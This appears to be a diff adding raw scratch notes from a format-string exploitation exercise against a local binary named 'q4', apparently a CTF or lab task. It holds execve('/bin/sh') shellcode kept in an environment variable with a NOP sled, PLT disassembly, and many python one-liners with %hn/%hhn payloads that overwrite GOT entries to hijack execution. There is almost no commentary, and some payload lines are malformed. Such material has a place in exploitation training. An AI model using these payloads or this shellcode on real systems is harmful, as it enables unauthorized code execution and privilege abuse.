@@ -1,0 +1,67 @@
+0xbfbb5806:	 "SHELLCODE=1\300\061\333\061ə\260\244̀j\vXQh//shh/bin\211\343Q\211\342S\211\341̀"
+0xbfb29806:	 "SHELLCODE=1\300\061\333\061ə\260\244̀j\vXQh//shh/bin\211\343Q\211\342S\211\341̀"
+0xbff74806:	 "SHELLCODE=1\300\061\333\061ə\260\244̀j\vXQh//shh/bin\211\343Q\211\342S\211\341̀"
+0xbfede806
+0xbfd7d73e
+0xbff50422
+
+080484b4 <printf@plt>:
+ 80484b4:	ff 25 f0 99 04 08    	jmp    DWORD PTR ds:0x80499f0
+ 80484ba:	68 28 00 00 00       	push   0x28
+ 80484bf:	e9 90 ff ff ff       	jmp    8048454 <_init+0x30>
+
+080484c4 <puts@plt>:
+ 80484c4:	ff 25 f4 99 04 08    	jmp    DWORD PTR ds:0x80499f4
+ 80484ca:	68 30 00 00 00       	push   0x30
+ 80484cf:	e9 80 ff ff ff       	jmp    8048454 <_init+0x30>
+
+080484e4 <strcmp@plt>:
+ 80484e4:	ff 25 fc 99 04 08    	jmp    DWORD PTR ds:0x80499fc
+ 80484ea:	68 40 00 00 00       	push   0x40
+ 80484ef:	e9 60 ff ff ff       	jmp    8048454 <_init+0x30>
+
+python -c "print('\xf4\x99\x04\x08\xf5\x99\x04\x08\xf6\x99\x04\x08\xf7\x99\x04\x08%246c%6\$x%82c%7\$x%99c%6\$x%260c%6\$x')" | ./q4
+python -c "print('\xf4\x99\x04\x08\xf4\x99\x04\x08%246c%6\$x%7\$x')" | ./q4
+
+\xf4\x99\x04\x08
+\xf5\x99\x04\x08
+\xf6\x99\x04\x08
+\xf7\x99\x04\x08
+%246c%6\$hhn
+%82c%7\$hhn
+
+
+
+%99c%8\$hhn
+%4c%9\$hhn'
+
+\xf4\x99\x04\x08\xf5\x99\x04\x08\xf6\x99\x04\x08\xf7\x99\x04\x08%246c%6\$hhn%82c%7\$hhn%99c%8\$hhn%4%9\$hhn'
+python -c "print('\xf4\x99\x04\x08\xf5\x99\x04\x08\xf6\x99\x04\x08\xf7\x99\x04\x08%246c%6\$hhn%82c%7\$hhn%99c%8\$hhn%4c%9\$hhn')" | ./q4
+python -c "print('\xf4\x99\x04\x08\xf5\x99\x04\x08\xf6\x99\x04\x08\xf7\x99\x04\x08%246c%6\$x%82c%7\$x%99c%8\$x%4%9\$x')" | ./q4
+python -c "print('AAAA%5\$x%6\$x')" | ./q4
+p
+
+export SHELLCODE=$(perl -e 'print "\x90"x200')$(cat /tmp/52_shell)
+
+python -c "print('\xf6\x99\x04\x08\xf4\x99\x04\x08%49075x%6\$hn%38987x%7\$hn')" | ./q4
+
+python -c "print('\xfe\x99\x04\x08\xfc\x99\x04\x08%49103c%6\$hn%6091c%7\$hn')" | ./q4
+
+python -c "print('\xfe\x99\x04\x08\xfc\x99\x04\x08%49103x%6\$hn%6091x%7\$hn\na')" | ./q4
+
+
+bfd7d7a2
+0xbfd7d7a2
+bff50616
+
+bff50616
+python -c "print('\xfe\x99\x04\x08\xfc\x99\x04\x08%49133c%6\$hn%17953c%7\$hn\na')" | ./q4
+
+0x8231810
+python -c "print('\xfe\x99\x04\x08\xfc\x99\x04\x08%33321c%6\$hn%38367c%7\$hn\na')" | ./q4
+
+0x80499e0 => 0x8048691
+python -c "print('\xe0\x99\x04\x08\xe2\x99\x04\x08%34441c%6\$hn%33139c%7\$hn')" | ./q4
+
+
+python -c "print('\xf\x99\x04\x08\xfc\x99\x04\x08%65656565c%6\$hn%7\$s.')" | ./q4
